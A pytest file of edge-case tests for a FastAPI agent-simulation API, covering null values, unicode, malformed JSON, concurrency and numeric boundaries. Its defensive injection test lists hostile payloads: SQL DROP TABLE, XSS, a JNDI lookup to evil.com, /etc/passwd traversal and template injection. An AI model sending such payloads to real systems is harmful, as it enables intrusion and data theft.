"""
Comprehensive Edge Cases and Production Readiness Tests
Tests for extreme edge cases, boundary conditions, and production scenarios.
"""
import pytest
import json
import time
import asyncio
import threading
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from fastapi import HTTPException
import sys
import os

# Add the project root to the path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from main import app
from core.agents.manager import AgentManager
from core.simulation.engine import SimulationEngine
from core.events.event_manager import EventManager
from core.artifacts.generator import ArtifactGenerator
from core.config import settings

client = TestClient(app)

class TestEdgeCasesComprehensive:
    """Comprehensive edge case testing"""
    
    def setup_method(self):
        """Setup for each test"""
        self.client = client
        self.agent_manager = AgentManager()
        self.simulation_engine = SimulationEngine()
        self.event_manager = EventManager()
        self.artifact_generator = ArtifactGenerator()
    
    # ========== NULL/NONE VALUE TESTS ==========
    
    def test_null_values_in_agent_creation(self):
        """Test agent creation with null/None values"""
        test_cases = [
            {"name": None, "type": "data_analyst", "skills": ["analysis"]},
            {"name": "", "type": "data_analyst", "skills": ["analysis"]},
            {"name": "test", "type": None, "skills": ["analysis"]},
            {"name": "test", "type": "", "skills": ["analysis"]},
            {"name": "test", "type": "data_analyst", "skills": None},
            {"name": "test", "type": "data_analyst", "skills": []},
        ]
        
        for case in test_cases:
            response = self.client.post("/api/v1/agents", json=case)
            # Should handle gracefully (either succeed with defaults or fail gracefully)
            assert response.status_code in [200, 201, 400, 422]
    
    def test_null_values_in_simulation_config(self):
        """Test simulation configuration with null values"""
        test_cases = [
            {"duration": None, "max_agents": 10},
            {"duration": 0, "max_agents": 10},
            {"duration": -1, "max_agents": 10},
            {"duration": 3600, "max_agents": None},
            {"duration": 3600, "max_agents": 0},
            {"duration": 3600, "max_agents": -1},
        ]
        
        for case in test_cases:
            response = self.client.post("/api/v1/simulation/configure", json=case)
            assert response.status_code in [200, 400, 422]
    
    # ========== UNICODE AND SPECIAL CHARACTER TESTS ==========
    
    def test_unicode_in_agent_names(self):
        """Test agent creation with unicode characters"""
        unicode_names = [
            "Agent_测试",  # Chinese
            "Agent_🤖",   # Emoji
            "Agent_Ñoño", # Spanish
            "Agent_Москва", # Cyrillic
            "Agent_العربية", # Arabic
            "Agent_مسلم",
            "Agent\x00test",  # Null byte
            "Agent\ttab",     # Tab
            "Agent\nnewline", # Newline
            "Agent\r\nwindows", # Windows newline
        ]
        
        for name in unicode_names:
            response = self.client.post("/api/v1/agents", json={
                "name": name,
                "type": "data_analyst",
                "skills": ["analysis"]
            })
            # Should handle gracefully
            assert response.status_code in [200, 201, 400, 422]
    
    def test_extremely_long_strings(self):
        """Test with extremely long strings"""
        long_name = "A" * 10000  # 10KB string
        very_long_name = "B" * 100000  # 100KB string
        
        for name in [long_name, very_long_name]:
            response = self.client.post("/api/v1/agents", json={
                "name": name,
                "type": "data_analyst",
                "skills": ["analysis"]
            })
            assert response.status_code in [200, 201, 400, 422]
    
    # ========== MALFORMED JSON TESTS ==========
    
    def test_malformed_json_payloads(self):
        """Test API endpoints with malformed JSON"""
        malformed_payloads = [
            '{"name": "test"',  # Missing closing brace
            '{"name": "test",}',  # Trailing comma
            '{"name": "test", "type":}',  # Missing value
            '{name: "test"}',  # Unquoted key
            '{"name": "test", "name": "duplicate"}',  # Duplicate keys
            '{"name": 123, "type": [}',  # Mismatched brackets
            '',  # Empty string
            'null',  # Just null
            'undefined',  # Invalid value
            '{"name": "test", "skills": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]}',  # Array with numbers
        ]
        
        for payload in malformed_payloads:
            try:
                response = self.client.post(
                    "/api/v1/agents",
                    data=payload,
                    headers={"Content-Type": "application/json"}
                )
                assert response.status_code in [400, 422, 500]
            except Exception:
                # Some malformed JSON might cause exceptions, which is acceptable
                pass
    
    # ========== CONCURRENT ACCESS TESTS ==========
    
    def test_concurrent_agent_creation(self):
        """Test concurrent agent creation"""
        def create_agent(index):
            return self.client.post("/api/v1/agents", json={
                "name": f"ConcurrentAgent_{index}",
                "type": "data_analyst",
                "skills": ["analysis"]
            })
        
        # Create multiple agents concurrently
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(create_agent, i) for i in range(20)]
            results = [future.result() for future in futures]
        
        # Check that most succeed
        success_count = sum(1 for r in results if r.status_code in [200, 201])
        assert success_count >= 15  # Allow for some race conditions
    
    def test_concurrent_simulation_operations(self):
        """Test concurrent simulation operations"""
        def start_simulation():
            return self.client.post("/api/v1/simulation/start")
        
        def stop_simulation():
            return self.client.post("/api/v1/simulation/stop")
        
        # Try concurrent start/stop operations
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for _ in range(10):
                futures.append(executor.submit(start_simulation))
                futures.append(executor.submit(stop_simulation))
            
            results = [future.result() for future in futures]
        
        # Should handle gracefully without crashes
        assert all(r.status_code < 500 for r in results)
    
    # ========== MEMORY AND RESOURCE TESTS ==========
    
    def test_memory_usage_with_many_agents(self):
        """Test memory usage with many agents"""
        initial_agents = []
        
        # Create many agents
        for i in range(50):
            response = self.client.post("/api/v1/agents", json={
                "name": f"MemoryTestAgent_{i}",
                "type": "data_analyst",
                "skills": ["analysis", "testing"]
            })
            if response.status_code in [200, 201]:
                initial_agents.append(response.json().get("id"))
        
        # Check system can handle the load
        response = self.client.get("/api/v1/agents")
        assert response.status_code == 200
        
        # Cleanup
        for agent_id in initial_agents:
            if agent_id:
                self.client.delete(f"/api/v1/agents/{agent_id}")
    
    def test_large_artifact_generation(self):
        """Test generation of large artifacts"""
        # Create an agent first
        agent_response = self.client.post("/api/v1/agents", json={
            "name": "LargeArtifactAgent",
            "type": "data_analyst",
            "skills": ["analysis", "reporting"]
        })
        
        if agent_response.status_code in [200, 201]:
            agent_id = agent_response.json().get("id")
            
            # Request large artifact
            response = self.client.post(f"/api/v1/agents/{agent_id}/artifacts", json={
                "type": "report",
                "description": "Generate a very comprehensive report with lots of data and analysis" * 100
            })
            
            assert response.status_code in [200, 201, 400, 422]
            
            # Cleanup
            self.client.delete(f"/api/v1/agents/{agent_id}")
    
    # ========== NETWORK AND TIMEOUT TESTS ==========
    
    def test_request_timeout_scenarios(self):
        """Test request timeout scenarios"""
        # Test with very slow operations
        with patch('core.simulation.engine.SimulationEngine.start_simulation') as mock_start:
            # Simulate slow operation
            mock_start.side_effect = lambda: time.sleep(1)
            
            response = self.client.post("/api/v1/simulation/start")
            assert response.status_code in [200, 408, 409, 500]  # Include 409 for conflict
    
    # ========== DATA PERSISTENCE TESTS ==========
    
    def test_data_consistency_after_restart(self):
        """Test data consistency simulation"""
        # Create some data
        agent_response = self.client.post("/api/v1/agents", json={
            "name": "PersistenceTestAgent",
            "type": "data_analyst",
            "skills": ["analysis"]
        })
        
        if agent_response.status_code in [200, 201]:
            agent_id = agent_response.json().get("id")
            
            # Simulate restart by creating new instances
            new_agent_manager = AgentManager()
            
            # Check if data is accessible (in a real scenario, this would test persistence)
            response = self.client.get(f"/api/v1/agents/{agent_id}")
            # Should handle gracefully whether data persists or not
            assert response.status_code in [200, 404]
    
    # ========== SECURITY EDGE CASES ==========
    
    def test_injection_attempts(self):
        """Test various injection attempts"""
        injection_payloads = [
            {"name": "'; DROP TABLE agents; --", "type": "data_analyst"},
            {"name": "<script>alert('xss')</script>", "type": "data_analyst"},
            {"name": "${jndi:ldap://evil.com/exploit}", "type": "data_analyst"},
            {"name": "../../etc/passwd", "type": "data_analyst"},
            {"name": "{{7*7}}", "type": "data_analyst"},  # Template injection
            {"name": "eval(alert('xss'))", "type": "data_analyst"},
        ]
        
        for payload in injection_payloads:
            payload["skills"] = ["analysis"]
            response = self.client.post("/api/v1/agents", json=payload)
            assert response.status_code in [200, 201, 400, 422]
            
            # If successful, ensure the data is properly sanitized
            if response.status_code in [200, 201]:
                agent_data = response.json()
                agent_id = agent_data.get("id")
                if agent_id:
                    # Check that the name doesn't contain dangerous content
                    get_response = self.client.get(f"/api/v1/agents/{agent_id}")
                    if get_response.status_code == 200:
                        agent_info = get_response.json()
                        name = agent_info.get("name", "")
                        # Should not contain script tags or SQL injection
                        assert "<script>" not in name.lower()
                        assert "drop table" not in name.lower()
                    
                    # Cleanup
                    self.client.delete(f"/api/v1/agents/{agent_id}")
    
    # ========== API VERSIONING TESTS ==========
    
    def test_unsupported_api_versions(self):
        """Test requests to unsupported API versions"""
        unsupported_endpoints = [
            "/api/v2/agents",
            "/api/v0/agents",
            "/api/agents",  # Missing version
            "/api/v1.1/agents",
            "/api/beta/agents",
        ]
        
        for endpoint in unsupported_endpoints:
            response = self.client.get(endpoint)
            assert response.status_code in [404, 400]
    
    # ========== CONTENT TYPE TESTS ==========
    
    def test_unsupported_content_types(self):
        """Test unsupported content types"""
        content_types = [
            "application/xml",
            "text/plain",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "application/octet-stream",
        ]
        
        for content_type in content_types:
            response = self.client.post(
                "/api/v1/agents",
                data='{"name": "test", "type": "data_analyst", "skills": ["analysis"]}',
                headers={"Content-Type": content_type}
            )
            assert response.status_code in [400, 415, 422]
    
    # ========== BOUNDARY VALUE TESTS ==========
    
    def test_integer_boundary_values(self):
        """Test integer boundary values"""
        boundary_values = [
            -2147483648,  # MIN_INT32
            2147483647,   # MAX_INT32
            -9223372036854775808,  # MIN_INT64
            9223372036854775807,   # MAX_INT64
            0,
            -1,
            1,
        ]
        
        for value in boundary_values:
            response = self.client.post("/api/v1/simulation/configure", json={
                "duration": value,
                "max_agents": 10
            })
            assert response.status_code in [200, 400, 422]
    
    def test_floating_point_edge_cases(self):
        """Test floating point edge cases"""
        float_values = [
            float('inf'),
            float('-inf'),
            float('nan'),
            1.7976931348623157e+308,  # Close to max float
            2.2250738585072014e-308,  # Close to min float
            0.0,
            -0.0,
        ]
        
        for value in float_values:
            try:
                response = self.client.post("/api/v1/simulation/configure", json={
                    "duration": value,
                    "max_agents": 10
                })
                assert response.status_code in [200, 400, 422]
            except (ValueError, OverflowError):
                # Some values might cause JSON serialization errors, which is acceptable
                pass
    
    # ========== ERROR RECOVERY TESTS ==========
    
    def test_error_recovery_after_failures(self):
        """Test system recovery after various failures"""
        # Cause some errors first
        error_responses = []
        
        # Invalid agent creation
        error_responses.append(self.client.post("/api/v1/agents", json={"invalid": "data"}))
        
        # Invalid simulation config
        error_responses.append(self.client.post("/api/v1/simulation/configure", json={"invalid": "config"}))
        
        # Now test that system still works normally
        normal_response = self.client.post("/api/v1/agents", json={
            "name": "RecoveryTestAgent",
            "type": "data_analyst",
            "skills": ["analysis"]
        })
        
        assert normal_response.status_code in [200, 201]
        
        # Cleanup
        if normal_response.status_code in [200, 201]:
            agent_id = normal_response.json().get("id")
            if agent_id:
                self.client.delete(f"/api/v1/agents/{agent_id}")
    
    # ========== PERFORMANCE DEGRADATION TESTS ==========
    
    def test_performance_under_load(self):
        """Test performance doesn't degrade significantly under load"""
        # Measure baseline performance
        start_time = time.time()
        response = self.client.get("/api/v1/agents")
        baseline_time = time.time() - start_time
        
        # Create some load
        agents_created = []
        for i in range(20):
            response = self.client.post("/api/v1/agents", json={
                "name": f"LoadTestAgent_{i}",
                "type": "data_analyst",
                "skills": ["analysis"]
            })
            if response.status_code in [200, 201]:
                agents_created.append(response.json().get("id"))
        
        # Measure performance under load
        start_time = time.time()
        response = self.client.get("/api/v1/agents")
        load_time = time.time() - start_time
        
        # Performance shouldn't degrade more than 10x
        assert load_time < baseline_time * 10
        
        # Cleanup
        for agent_id in agents_created:
            if agent_id:
                self.client.delete(f"/api/v1/agents/{agent_id}")

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
